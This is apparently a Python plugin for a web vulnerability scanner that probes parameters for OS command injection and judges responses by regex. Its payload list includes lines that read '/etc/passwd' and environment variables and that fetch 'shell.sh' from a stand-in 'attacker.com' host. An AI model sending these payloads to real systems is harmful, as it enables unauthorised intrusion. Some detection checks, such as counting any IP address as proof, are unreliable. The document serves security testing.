"""
Command Injection detection plugin
"""

import re
from typing import List, Dict, Any

from vulnmind.plugins.base import ParameterPlugin
from vulnmind.core.models import VulnType, SeverityLevel


class CommandInjectionPlugin(ParameterPlugin):
    """Command Injection vulnerability detection plugin"""
    
    def __init__(self):
        super().__init__()
        self.vuln_type = VulnType.COMMAND_INJECTION
        self.severity = SeverityLevel.CRITICAL
        
        # Command injection error patterns
        self.error_patterns = [
            # Unix/Linux command errors
            r"sh: .+: command not found",
            r"bash: .+: command not found",
            r"/bin/sh: .+: not found",
            r"No such file or directory",
            r"Permission denied",
            r"cannot execute binary file",
            
            # Windows command errors
            r"'.+' is not recognized as an internal or external command",
            r"The system cannot find the file specified",
            r"Access is denied",
            r"Bad file number",
            r"The filename, directory name, or volume label syntax is incorrect",
            
            # General command output
            r"uid=\d+.*gid=\d+",  # id command output
            r"total \d+",  # ls -la output
            r"\d+:\d+:\d+\s+up",  # uptime output
            r"^\s*\d+\s+\d+\s+\d+\s+\d+%",  # df output
            
            # Process information
            r"PID\s+TTY\s+TIME\s+CMD",  # ps output header
            r"^\s*\d+\s+pts/\d+",  # ps output
            
            # Network information
            r"\d+\.\d+\.\d+\.\d+",  # IP addresses from commands like ifconfig
            r"inet\s+addr:",  # ifconfig output
            
            # File system information
            r"drwx",  # directory permissions
            r"-rw-",   # file permissions
        ]
        
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE | re.MULTILINE) 
                                 for pattern in self.error_patterns]
    
    def get_payloads(self) -> List[str]:
        """Get command injection payloads"""
        return [
            # Basic command separators
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            
            # Linux/Unix commands
            "; id",
            "| id",
            "& id",
            "`id`",
            "$(id)",
            
            "; ls",
            "| ls",
            "& ls -la",
            "`ls`",
            "$(ls)",
            
            "; pwd",
            "| pwd",
            "& pwd",
            "`pwd`",
            "$(pwd)",
            
            "; uname -a",
            "| uname -a",
            "& uname -a",
            "`uname -a`",
            "$(uname -a)",
            
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            
            # Windows commands
            "; dir",
            "| dir",
            "& dir",
            
            "; whoami",
            "| whoami",
            "& whoami",
            
            "; net user",
            "| net user",
            "& net user",
            
            "; ipconfig",
            "| ipconfig",
            "& ipconfig",
            
            "; systeminfo",
            "| systeminfo",
            "& systeminfo",
            
            # Time-based detection
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            
            "; ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1",
            "& ping -c 4 127.0.0.1",
            
            # Windows time delay
            "; timeout 5",
            "| timeout 5",
            "& timeout 5",
            
            "; ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "& ping -n 5 127.0.0.1",
            
            # Newline injection
            "\n whoami",
            "\n id",
            "\n ls",
            "\r\n whoami",
            "%0a whoami",
            "%0d%0a whoami",
            
            # URL encoded
            "%3B%20whoami",  # ; whoami
            "%7C%20whoami",  # | whoami
            "%26%20whoami",  # & whoami
            
            # Double URL encoded
            "%253B%2520whoami",
            "%257C%2520whoami",
            "%2526%2520whoami",
            
            # Null byte injection
            "\x00; whoami",
            "%00; whoami",
            
            # Shell metacharacters
            "; echo 'COMMAND_INJECTION'",
            "| echo 'COMMAND_INJECTION'",
            "& echo 'COMMAND_INJECTION'",
            "`echo 'COMMAND_INJECTION'`",
            "$(echo 'COMMAND_INJECTION')",
            
            # File operations
            "; touch /tmp/vuln_test",
            "| touch /tmp/vuln_test",
            "& touch /tmp/vuln_test",
            
            # Network operations
            "; wget http://attacker.com/shell.sh",
            "| wget http://attacker.com/shell.sh",
            "& wget http://attacker.com/shell.sh",
            
            "; curl http://attacker.com/",
            "| curl http://attacker.com/",
            "& curl http://attacker.com/",
            
            # Bypass attempts
            "';whoami;'",
            "';id;'",
            '";whoami;"',
            '";id;"',
            
            # Parameter pollution
            "param=value; whoami",
            "param=value| whoami",
            "param=value& whoami",
            
            # Quoted injections
            "'; whoami; echo '",
            '"; whoami; echo "',
            "'; id; echo '",
            '"; id; echo "',
            
            # Multiple commands
            "; whoami; id; pwd",
            "| whoami | id | pwd",
            "& whoami & id & pwd",
            
            # Environment variables
            "; echo $PATH",
            "| echo $PATH",
            "& echo $PATH",
            "`echo $PATH`",
            "$(echo $PATH)",
            
            "; env",
            "| env",
            "& env",
            "`env`",
            "$(env)",
        ]
    
    def detect_vulnerability(self, response_text: str, payload: str) -> bool:
        """Detect command injection vulnerability"""
        # Check for command execution patterns
        for pattern in self.compiled_patterns:
            if pattern.search(response_text):
                return True
        
        # Check for specific command outputs
        command_outputs = [
            "uid=", "gid=",  # id command
            "total ",  # ls -la
            "drwx", "-rw-", "-rwx",  # file permissions
            "bin/sh", "bin/bash",  # shell references
            "command not found",
            "permission denied",
            "no such file",
            "access denied",
            "PID", "TTY", "CMD",  # ps output
            "inet addr:", "inet ",  # network info
        ]
        
        response_lower = response_text.lower()
        for output in command_outputs:
            if output.lower() in response_lower:
                return True
        
        # Check for injected echo output
        if "COMMAND_INJECTION" in response_text:
            return True
        
        # Check for directory listings
        if re.search(r'^\s*total\s+\d+', response_text, re.MULTILINE):
            return True
        
        # Check for user information
        if re.search(r'uid=\d+.*gid=\d+', response_text):
            return True
        
        # Check for system information
        if re.search(r'\d+\.\d+\.\d+\.\d+', response_text):  # IP addresses
            return True
        
        return False
    
    def calculate_confidence(self, response_text: str, payload: str) -> float:
        """Calculate confidence for command injection detection"""
        confidence = 0.3  # Base confidence
        
        # High confidence indicators
        high_confidence_patterns = [
            r"uid=\d+.*gid=\d+",  # id command output
            r"total \d+",  # ls output
            r"command not found",
            r"permission denied"
        ]
        
        for pattern in high_confidence_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                confidence += 0.5
                break
        
        # Medium confidence indicators
        medium_indicators = [
            "bin/sh", "bin/bash", "PID", "TTY", "CMD",
            "drwx", "-rw-", "inet addr:"
        ]
        
        response_lower = response_text.lower()
        for indicator in medium_indicators:
            if indicator.lower() in response_lower:
                confidence += 0.3
                break
        
        # Check for specific injected content
        if "COMMAND_INJECTION" in response_text:
            confidence += 0.4
        
        # Check for multiple command indicators
        indicator_count = 0
        all_indicators = ["uid=", "gid=", "total", "drwx", "-rw-", "bin/", "command not found"]
        for indicator in all_indicators:
            if indicator.lower() in response_lower:
                indicator_count += 1
        
        if indicator_count > 1:
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    def get_description(self) -> str:
        """Get vulnerability description"""
        return (
            "Command Injection vulnerability allows attackers to execute arbitrary "
            "system commands on the server by injecting shell metacharacters into "
            "application parameters that are passed to system calls."
        )
    
    def get_remediation(self) -> str:
        """Get remediation advice"""
        return (
            "Avoid using system calls with user input. Use parameterized APIs instead "
            "of shell commands. Implement strict input validation and sanitization. "
            "Use whitelist-based validation for allowed characters. Apply principle "
            "of least privilege to application processes. Consider using safe "
            "alternatives to system() calls."
        )
    
    def get_cwe_id(self) -> int:
        """Get CWE ID for Command Injection"""
        return 78
    
    def get_references(self) -> List[str]:
        """Get reference URLs"""
        return [
            "https://owasp.org/www-community/attacks/Command_Injection",
            "https://cwe.mitre.org/data/definitions/78.html",
            "https://portswigger.net/web-security/os-command-injection"
        ]
